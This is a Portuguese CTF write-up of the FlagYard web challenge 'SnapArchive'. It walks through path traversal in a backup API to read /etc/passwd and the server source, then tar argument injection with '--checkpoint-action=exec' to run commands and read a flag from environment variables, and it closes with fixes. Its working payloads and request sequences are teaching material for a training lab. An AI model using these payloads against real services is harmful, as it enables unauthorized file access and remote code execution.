---
title: 'SnapArchive: Writeup completo'
description: 'Um serviço de backup de documentos confia demais no que você diz que quer guardar: e essa confiança de mais foi o suficiente pra sair lendo arquivos do próprio servidor e, no fim, assumir o controle total dele.'
event: 'FlagYard (Training Labs)'
category: 'web'
subcategory: 'Path Traversal'
difficulty: 'easy'
tags:
  - path-traversal
  - argument-injection
  - tar
  - rce
  - gtfobins
pubDate: 2026-08-25
author: 'Niedson'
draft: false
---

> [!NOTE/Sobre o desafio]
> **Plataforma:** FlagYard (Training Labs)
> **Categoria:** Web · **Dificuldade:** Easy · **Pontos:** 120
> **Vulnerabilidades:** Path Traversal (leitura arbitrária de arquivos) → escalada para **Argument Injection no `tar`** (execução remota de comandos)
> **Flag:** `FlagY{...}` (dinâmica: muda a cada instância)

Este writeup foi escrito partindo do zero: mesmo que você nunca tenha ouvido falar de CTF, de "path traversal" ou de "command injection", a ideia é que ao final você entenda **por que** cada passo foi dado e **como** raciocinamos até a flag.

---

## 1. Contexto: o que é isso tudo?

### 1.1. O que é um CTF

Um **CTF** (_Capture The Flag_) é uma competição de segurança da informação. Cada desafio esconde uma **flag**: um texto secreto num formato específico (aqui, `FlagY{...}`): dentro de um sistema propositalmente vulnerável. Seu trabalho é encontrar e explorar a falha para "capturar" essa flag e provar que resolveu o desafio.

Nos desafios da categoria **Web**, o alvo é uma aplicação web: um site rodando num servidor. Você interage com ele como um usuário comum (ou não tão comum) e procura brechas na forma como ele processa suas requisições.

### 1.2. O desafio: SnapArchive

O SnapArchive se descreve como um _"Personal document backup & archiving service"_: um serviço de backup e arquivamento de documentos pessoais. A aplicação (versão 1.4.2) tem quatro funções na tela:

1. **Add a document**: você digita um _nome de arquivo_ e um _conteúdo_ de texto, e envia. O documento fica guardado no seu "armazenamento pessoal".
2. **Your documents**: lista os documentos que você já enviou, com caixinhas de seleção.
3. **Create backup**: você escolhe alguns documentos (marcando as caixinhas), dá um nome ao backup, e o servidor **empacota** esses documentos num arquivo compactado para download.
4. **Backup archives**: lista os backups criados, com um link para baixar cada um.

Guarde bem a função 3: **empacotar arquivos**. É a peça central de tudo.

---

## 2. Os conceitos de vulnerabilidade (explicados do zero)

Antes de tocar no alvo, vamos entender as duas hipóteses de falha que uma aplicação assim naturalmente levanta. Elas guiaram toda a investigação.

### 2.1. Hipótese A: Path Traversal (no nome do arquivo)

**A ideia central.** Sistemas de arquivos são organizados em pastas (diretórios). Um caminho como `/tmp/data/uploads/notas.txt` descreve "entre em `tmp`, depois `data`, depois `uploads`, e pegue `notas.txt`".

Existe um atalho especial: `..` significa **"volte uma pasta"**. Então:

```
/tmp/data/uploads/../  →  /tmp/data/
/tmp/data/uploads/../../  →  /tmp/
/tmp/data/uploads/../../../  →  /   (a raiz do sistema)
```

**Onde mora o perigo.** Imagine que a aplicação sempre salva/lê arquivos dentro de uma pasta "segura", tipo `/tmp/data/uploads/`, e monta o caminho colando o nome que **você** forneceu:

```
caminho_final = "/tmp/data/uploads/" + nome_do_arquivo
```

Se o programador confia cegamente no `nome_do_arquivo` e você envia algo como:

```
../../../etc/passwd
```

o caminho final vira:

```
/tmp/data/uploads/../../../etc/passwd   →   /etc/passwd
```

Ou seja, você "escapou" da pasta segura e alcançou um arquivo do sistema (`/etc/passwd`, um arquivo clássico do Linux que lista os usuários). Isso é **Path Traversal** (também chamado _Directory Traversal_): usar `../` para ler (ou escrever) arquivos fora da pasta pretendida.

Num serviço de backup, o vetor natural é o **nome do arquivo** ou a **lista de arquivos escolhidos para o backup**: se eu conseguir fazer o servidor incluir `../../../etc/passwd` no pacote, eu baixo o pacote e leio o conteúdo.

### 2.2. Hipótese B: Command / Argument Injection (na criação do backup)

**Como programas "empacotam" arquivos.** Para juntar vários arquivos num só (um `.zip` ou `.tar.gz`), a forma mais preguiçosa e comum é o servidor chamar um **programa externo** de linha de comando, como o `tar` ou o `zip`. Por exemplo:

```
tar -czf backup.tar.gz arquivo1.txt arquivo2.txt
```

Aqui `tar` é o programa, e o resto são **argumentos**: `-czf` é uma opção (create, gzip, file), `backup.tar.gz` é o nome de saída, e os `.txt` são os arquivos a incluir.

**Command Injection (injeção de comando).** Se o servidor constrói esse comando colando texto seu **dentro de um shell** (o interpretador de linha de comando), caracteres especiais viram armas. No shell, `;` separa comandos, `|` encadeia, `$(...)` e crases executam sub-comandos. Então um nome de backup como:

```
meu-backup; rm -rf /
```

poderia virar dois comandos: o `tar` **e** um `rm -rf /`. Isso é **Command Injection**: fazer o servidor executar comandos que você escolheu.

**Argument Injection (injeção de argumentos): mais sutil e crucial aqui.** Mesmo que o servidor seja cuidadoso e **não** use um shell (passando cada pedaço como argumento separado, sem interpretar `;` ou `$()`), ainda pode haver um problema: se o seu texto vira um **argumento** do programa, você pode injetar **opções** que o programa aceita.

Muitos programas de linha de comando têm opções perigosas. O `tar`, por exemplo, tem a opção `--checkpoint-action=exec=COMANDO`, que manda o próprio `tar` **executar um comando** durante o empacotamento. Se eu conseguir colar `--checkpoint-action=exec=...` na lista de argumentos, o `tar` roda meu comando: sem eu precisar de nenhum `;` ou `$()`. Isso é catalogado no [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), um repositório de "truques" com binários do Unix.

> [!TIP/Resumo das hipóteses]
> Ou eu escapo da pasta com `../` para **ler** arquivos (A), ou eu abuso do `tar`/`zip` da criação de backup para **executar** algo (B). No fim, veremos que o desafio exige **as duas ideias combinadas**.

---

## 3. Reconhecimento (entendendo o alvo)

Todo ataque começa mapeando como a aplicação funciona por baixo dos panos. Abrindo a aplicação e inspecionando o JavaScript da página, descobrimos que o front-end conversa com três **endpoints** de API (URLs que o servidor responde):

| Endpoint      | Método     | Função                     |
| ------------- | ---------- | -------------------------- |
| `/api/files`  | GET / POST | Listar e enviar documentos |
| `/api/backup` | GET / POST | Listar e criar backups     |
| `/api/info`   | GET        | Status do serviço          |

O primeiro tesouro veio do `/api/info`:

```json
{
  "success": true,
  "service": "SnapArchive",
  "version": "1.4.2",
  "storage": {
    "uploadsDir": "/tmp/data/uploads",
    "backupsDir": "/tmp/data/backups",
    "uploadedFiles": 1,
    "backupArchives": 0
  }
}
```

Isso nos entregou **os caminhos reais no servidor**:

- Documentos ficam em `/tmp/data/uploads`
- Backups ficam em `/tmp/data/backups`

Saber que a "pasta segura" é `/tmp/data/uploads` é ouro: agora sei exatamente quantos `../` preciso para chegar à raiz `/` do sistema (três: `uploads` → `data` → `tmp` → `/`).

Listando os documentos (`GET /api/files`), havia um `readme.txt` já presente. E `GET /api/backup` mostrava a lista de backups (vazia). Ao **criar** um backup de teste, a resposta revelou o mecanismo:

```json
{
  "success": true,
  "message": "Backup created successfully.",
  "archive": {
    "name": "backup-1787633214598.tar.gz",
    "path": "/tmp/data/backups/backup-1787633214598.tar.gz",
    "sizeBytes": 244
  }
}
```

Dois fatos importantes:

1. O backup é um **`.tar.gz`** → quase certamente o servidor está usando o programa **`tar`** (isso conecta direto com a Hipótese B).
2. O nome do arquivo é gerado automaticamente (`backup-<timestamp>.tar.gz`), ignorando o nome que enviei.

E o download? Inspecionando o front-end, o link de download é:

```
GET /api/backup/<nome-do-arquivo>
```

Então o fluxo de ataque para **ler** um arquivo qualquer seria: _fazer o servidor incluí-lo num backup → baixar o `.tar.gz` → descompactar → ler o conteúdo._

---

## 4. Testando a Hipótese A: Path Traversal

A pergunta agora é direta: **a lista de arquivos escolhidos para o backup é validada?** Se eu enviar `../../../../etc/passwd` como se fosse um dos "documentos selecionados", o servidor recusa ou obedece?

A criação de backup é um `POST /api/backup` com um corpo JSON assim:

```json
{ "name": "meu-backup", "files": ["readme.txt"] }
```

O campo `files` é a lista de documentos. Vamos abusar dele. Testando vários caminhos:

```javascript
// Cada tentativa cria um backup pedindo para incluir um caminho "escapado"
POST /api/backup   { "name": "t", "files": ["../../../../etc/passwd"] }   // → 200 OK ✅
POST /api/backup   { "name": "t", "files": ["../../../flag"] }           // → 502 (não existe) ❌
POST /api/backup   { "name": "t", "files": ["/flag"] }                   // → 502 ❌
```

**O `../../../../etc/passwd` funcionou** (gerou um `.tar.gz` de 454 bytes), enquanto caminhos inexistentes davam erro `502`. Ou seja: **o path traversal existe**. O servidor não valida os nomes: ele passa direto pro `tar`.

Para confirmar, baixamos o `.tar.gz` gerado e o descompactamos (dá pra fazer isso no próprio navegador com a API `DecompressionStream` e um pequeno parser do formato `tar`). Resultado:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
bun:x:1000:1000:...:/home/bun:/bin/bash
```

Conseguimos ler o `/etc/passwd`! Isso confirma **leitura arbitrária de arquivos**. Note o usuário `bun` (uid 1000): a aplicação roda com o runtime **Bun** (um ambiente JavaScript/TypeScript, alternativa ao Node.js).

> [!NOTE/Detalhe técnico do tar]
> Quando o `tar` recebe um caminho com `../`, ele guarda o arquivo no pacote removendo os `../` do começo (por isso a entrada apareceu como `etc/passwd`). O conteúdo, porém, é o do arquivo real. E como o `tar` **entra recursivamente em diretórios**, dá até para pedir uma pasta inteira e listar seu conteúdo: foi assim que mapeamos o sistema (veja a seção 6).

---

## 5. Confirmando pela fonte: lendo o código do servidor

Como agora temos leitura arbitrária, podemos ler **o próprio código-fonte da aplicação** e entender exatamente o que acontece. Usando o mesmo truque de traversal, pedimos a pasta `/app`:

```
app/run
app/package.json
app/public/index.html
app/src/server.ts
app/src/http-core.ts       ← a lógica principal
app/src/jail-server.ts
```

No `http-core.ts`, encontramos o coração do recurso de backup:

```typescript
import { $ } from 'bun'; // o "shell" do Bun

// ... mais adiante, dentro do handler de /api/backup:

// (comentário real do código:)
// "there was never a reported case of anyone typing a filename by hand
//  instead of clicking a checkbox, so stricter validation was de-scoped
//  for the v1.4 release."
for (const f of files) {
  if (typeof f !== 'string' || f.length === 0 || f.length > 300) {
    return badRequest("Each entry in 'files' must be a non-empty string (max 300 chars).");
  }
}

const archiveName = `${archiveBase}.tar.gz`;
const archivePath = path.join(BACKUP_DIR, archiveName);

// A LINHA VULNERÁVEL:
await $`tar -czf ${archivePath} -C ${UPLOAD_DIR} ${files}`.quiet();
```

Vamos dissecar essa linha, porque ela explica **tudo**:

```
tar -czf <archivePath> -C /tmp/data/uploads <files...>
```

- `-c` cria um arquivo, `-z` comprime com gzip, `-f <archivePath>` define o arquivo de saída.
- `-C /tmp/data/uploads` diz ao `tar`: "mude para esta pasta antes de pegar os arquivos".
- `<files...>` são os nomes que **eu** enviei: cada item da lista `files` vira **um argumento separado**.

E a validação? Só checa que cada item é uma string de 1 a 300 caracteres. **Nenhuma checagem de `../`, `/` ou de opções.** O próprio comentário no código admite que "a validação mais rigorosa foi retirada de escopo na versão 1.4". Isso confirma a Hipótese A de forma cristalina.

### E a Hipótese B (command injection clássico)?

Repare no `$\`...\``do Bun. O template`$` do Bun é um **shell seguro**: ele **escapa automaticamente** cada valor interpolado. Ou seja, se eu colocar `; id` ou `$(id)`num nome, o Bun trata isso como texto literal, e não como comandos. Testamos vários payloads com`;`, `|`, `$()`, crases: **todos falharam**. Não há command injection via metacaracteres de shell aqui.

Parece um beco sem saída para a Hipótese B... mas não é. Guarde essa observação: **cada item de `files` vira um argumento do `tar`, e não há um `--` separando as opções dos arquivos.** Voltaremos a isso.

---

## 6. A reviravolta: a flag não é um arquivo comum

Com leitura arbitrária em mãos, a coisa mais óbvia é procurar a flag como um arquivo. Testamos exaustivamente os locais clássicos:

```
/flag        /flag.txt      /flag.md      /flag.json
/app/flag.txt   /home/bun/flag.txt   /tmp/flag   /root/flag.txt
/etc/flag       /var/flag.txt   /srv/flag.txt   ...
```

**Nenhum existia.** Também mapeamos o sistema pedindo diretórios inteiros ao `tar` (que recursa em pastas):

- `/app`, `/home/bun`, `/tmp`, `/opt` → listados, **sem flag**.
- `/etc`, `/var`, `/usr` → **falhavam por completo**. Motivo: se dentro da pasta há **um** arquivo que o usuário `bun` não tem permissão de ler (por exemplo `/etc/shadow`), o `tar` aborta com erro e o backup inteiro falha (`502`). Isso nos impede de _listar_ essas pastas, embora ainda pudéssemos ler um arquivo específico delas se soubéssemos o nome.

Confirmamos também que `/etc/passwd` só tinha usuários padrão do Debian + o `bun`, sem nenhum usuário/home suspeito escondendo a flag.

**Conclusão parcial:** a flag **não está no disco** (pelo menos não com um nome adivinhável e legível). Isso é uma escolha comum de design de desafios: a flag é **dinâmica**, gerada por instância e injetada de outra forma: tipicamente como uma **variável de ambiente**.

E aqui está o problema: variáveis de ambiente de um processo em Linux ficam em `/proc/<pid>/environ`. Tentamos ler esse arquivo via traversal... e ele voltou **vazio (0 bytes)**. Por quê? Arquivos dentro de `/proc` são "virtuais": o `tar` consulta o tamanho do arquivo antes de lê-lo, o kernel reporta tamanho `0` para esses arquivos, e o `tar` conclui que não há nada a copiar. Ou seja: **path traversal com `tar` não consegue ler variáveis de ambiente.**

Precisamos de algo mais poderoso do que "ler arquivos". Precisamos **executar comandos**.

---

## 7. Escalando para RCE: Argument Injection no `tar`

Aqui as duas hipóteses se encontram. Lembra da observação do fim da seção 5?

> [!IMPORTANT/Ponto-chave]
> Cada item de `files` vira um argumento do `tar`, e **não há um `--`** separando as opções dos nomes de arquivo.

Em programas de linha de comando Unix, o `--` é um marcador que significa "acabaram as opções; tudo depois disso é um nome de arquivo, mesmo que comece com `-`". Como o comando do SnapArchive é:

```
tar -czf <saida> -C /tmp/data/uploads <files...>
```

sem nenhum `--` antes de `<files...>`, o `tar` vai **interpretar como opção** qualquer item da minha lista que comece com `-` ou `--`. E eu controlo 100% dessa lista.

O `tar` tem justamente uma dupla de opções perigosas (o truque do GTFOBins):

- `--checkpoint=1`: faz o `tar` emitir um "checkpoint" a cada registro processado.
- `--checkpoint-action=exec=COMANDO`: **executa `COMANDO` a cada checkpoint**.

Combinando: se eu passar essas duas opções como se fossem "arquivos", o `tar` executa um comando meu. E o mais elegante: isso **não depende de shell metacaracteres**, então o escape automático do Bun (que barrou o command injection clássico) **não protege contra isto**: são argumentos perfeitamente legítimos do `tar`.

### O payload

Enviamos ao `POST /api/backup` a seguinte lista de `files`:

```json
{
  "name": "x",
  "files": [
    "--checkpoint=1",
    "--checkpoint-action=exec=id > /tmp/data/uploads/rce.txt 2>&1",
    "readme.txt"
  ]
}
```

O que cada item faz:

- `--checkpoint=1` → aciona um checkpoint logo no primeiro registro.
- `--checkpoint-action=exec=id > /tmp/data/uploads/rce.txt 2>&1` → manda o `tar` executar `id` e gravar a saída dentro da pasta de uploads (que eu consigo ler de volta!).
- `readme.txt` → um arquivo de verdade, para o `tar` ter algo a empacotar e de fato chegar a um checkpoint.

O comando de `--checkpoint-action=exec=` é entregue a um shell pelo próprio `tar` (via `system()`), então redirecionamentos como `>` e `2>&1` funcionam normalmente. Por isso gravamos a saída num arquivo dentro de `/tmp/data/uploads`: assim ela vira um "documento" que podemos baixar depois.

Resultado: o backup retornou sucesso e, ao listar os documentos (`GET /api/files`), lá estava o **`rce.txt`**. Lendo seu conteúdo (novamente via backup + download):

```
uid=1000(bun) gid=1000(bun) groups=1000(bun)
```

**Temos execução remota de comandos (RCE)** como o usuário `bun`. 🎯

> [!TIP/A sacada do desafio]
> O path traversal (Hipótese A) é uma isca: ele resolve "leitura de arquivos", mas a flag não é um arquivo. O mesmo bug de não-validação (passar entradas do usuário direto pro `tar` sem `--`) permite escalar de "ler arquivo" para "executar comando" (Hipótese B, na forma de _argument injection_). Você precisa das duas ideias.

---

## 8. Capturando a flag

Com RCE, ler variáveis de ambiente é trivial: basta rodar `env`. Reaproveitamos a técnica, gravando a saída num arquivo legível:

```json
{
  "name": "x",
  "files": [
    "--checkpoint=1",
    "--checkpoint-action=exec=env > /tmp/data/uploads/env.txt 2>&1",
    "readme.txt"
  ]
}
```

Depois baixamos o `env.txt`. Conteúdo (com destaque para o que importa):

```
TAR_ARCHIVE=/tmp/data/backups/backup-1787634304267.tar.gz
DATA_DIR=/tmp/data
TAR_FORMAT=gnu
DYN_FLAG=FlagY{9f49c4b20d513569a4e362e86340a2b7}      ← 🚩 A FLAG
TAR_BLOCKING_FACTOR=20
PWD=/app
TAR_CHECKPOINT=1
TAR_VERSION=1.35
TAR_SUBCOMMAND=-c
```

A flag estava na variável de ambiente **`DYN_FLAG`** (o prefixo `DYN` reforça que é _dinâmica_, gerada por instância). As variáveis `TAR_*` também aparecem porque são definidas pelo próprio `tar` para o processo do `--checkpoint-action`: um bônus que confirma que estamos rodando dentro do contexto do `tar`.

### 🚩 Flag

```
FlagY{9f49c4b20d513569a4e362e86340a2b7}
```

_(A sua será diferente, pois é gerada por instância.)_

---

## 9. Recapitulando a cadeia de exploração

```
1. Recon
   └─ /api/info vaza uploadsDir = /tmp/data/uploads
      → sei exatamente quantos "../" preciso para chegar em "/"

2. Path Traversal (leitura arbitrária)
   └─ POST /api/backup { files: ["../../../../etc/passwd"] }
      → tar -czf out -C /tmp/data/uploads ../../../../etc/passwd
      → baixo o .tar.gz, descompacto, leio o arquivo
      → li /etc/passwd e o código-fonte em /app

3. Beco sem saída aparente
   └─ a flag não é um arquivo no disco (é uma env var)
   └─ /proc/self/environ vem vazio via tar (arquivo virtual, tamanho 0)
      → leitura de arquivo não basta; preciso de execução

4. Argument Injection no tar → RCE
   └─ o comando não tem "--", então itens de "files" viram OPÇÕES do tar
   └─ files: ["--checkpoint=1",
              "--checkpoint-action=exec=<comando> > /tmp/data/uploads/out.txt",
              "readme.txt"]
      → o tar executa meu comando; gravo a saída na pasta de uploads
      → leio a saída baixando-a como backup

5. Captura da flag
   └─ exec=env  →  DYN_FLAG=FlagY{...}
```

---

## 10. Por que a aplicação era vulnerável (e como corrigir)

A raiz de tudo é **uma única falha**: passar entradas controladas pelo usuário diretamente como argumentos de um programa externo, sem validação. O Bun shell (`$`) protegeu contra _command injection_ clássico (metacaracteres), mas isso deu uma falsa sensação de segurança: não protege contra **path traversal** nem contra **argument injection**.

Como corrigir, em camadas:

1. **Validar os nomes de arquivo (allow-list).** Aceitar somente nomes simples, ex.: casar com uma expressão como `^[A-Za-z0-9._-]{1,255}$`, **rejeitando** qualquer `/`, `..` ou nome começando com `-`.
2. **Confirmar que o arquivo realmente pertence ao diretório de uploads.** Resolver o caminho absoluto (`realpath`) e verificar que ele começa com `/tmp/data/uploads/` antes de usá-lo.
3. **Usar o separador `--`** no comando: `tar -czf saida -C /tmp/data/uploads -- arquivo1 arquivo2`. Isso sozinho já mata a _argument injection_, pois tudo depois do `--` é tratado como nome de arquivo, nunca como opção.
4. **Preferir uma biblioteca em vez de invocar o `tar` externo.** Empacotar via uma lib de tar/zip da própria linguagem elimina toda a superfície de injeção de argumentos de linha de comando.
5. **Princípio do menor privilégio.** Rodar o processo com o mínimo necessário e não deixar segredos (como a flag/credenciais) em variáveis de ambiente do mesmo processo que manipula entrada do usuário.

---

## 11. Lições para levar

- **Path traversal** é sobre o `..`: qualquer lugar onde a aplicação usa um nome/caminho que você fornece para acessar o disco é um candidato. Descobrir o diretório-base (aqui, via `/api/info`) torna o ataque preciso.
- **"Sem shell" não é o mesmo que "seguro".** Escapar metacaracteres impede _command injection_, mas se o seu texto vira **argumento** de um binário, você ainda pode injetar **opções**: e muitos binários têm opções que executam comandos (`tar --checkpoint-action`, `--to-command`, `--use-compress-program`; `zip -T -TT`, etc.: veja o GTFOBins).
- **Sempre use `--`** ao construir comandos com entrada do usuário, e valide o formato dos nomes.
- **Quando a leitura de arquivos não acha a flag, pense em variáveis de ambiente**: e lembre que `/proc/.../environ` não é lido por ferramentas que confiam no tamanho do arquivo (como o `tar`); nesse caso é preciso escalar para execução de comandos.
- **Leia o código-fonte quando puder.** A leitura arbitrária virou nossa melhor ferramenta de recon: o comentário "de-scoped for v1.4" e a linha do `tar` sem `--` entregaram o caminho todo.

---

_Writeup do desafio SnapArchive (FlagYard · Web · Easy)._
